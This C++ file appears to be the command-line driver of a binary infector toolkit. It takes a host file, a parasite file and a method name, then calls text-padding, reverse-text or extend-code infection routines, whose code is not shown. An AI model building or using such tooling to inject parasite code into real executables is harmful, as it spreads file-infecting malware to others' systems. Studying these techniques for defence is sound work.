#include "common/string.hh"
#include "infector/common_infection.hh"
#include "infector/extend_code_infect.hh"
#include "infector/padding_infect.hh"
#include "infector/reverse_text_infect.hh"
#include "std/stdio.hh"

const char* TEXT_PADDING = "text_padding";
const char* REVERSE_TEXT = "reverse_text";
const char* EXTEND_CODE = "extend_code";

// Usage %s <host> <parasite> <infection method>
int main(int argc, char** argv) {
  if (argc != 4) {
    return EXIT_FAILURE;
  }

  auto method = argv[3];
  bool ret = false;

  if (vt::common::String(method) == TEXT_PADDING) {
    ret = vt::infector::infect<vt::infector::PaddingInfect>(argv[1], argv[2]);
  } else if (vt::common::String(method) == REVERSE_TEXT) {
    ret =
        vt::infector::infect<vt::infector::ReverseTextInfect>(argv[1], argv[2]);
  } else if (vt::common::String(method) == EXTEND_CODE) {
    ret =
        vt::infector::infect<vt::infector::ExtendCodeInfect>(argv[1], argv[2]);
  }

  return ret ? EXIT_SUCCESS : EXIT_FAILURE;
}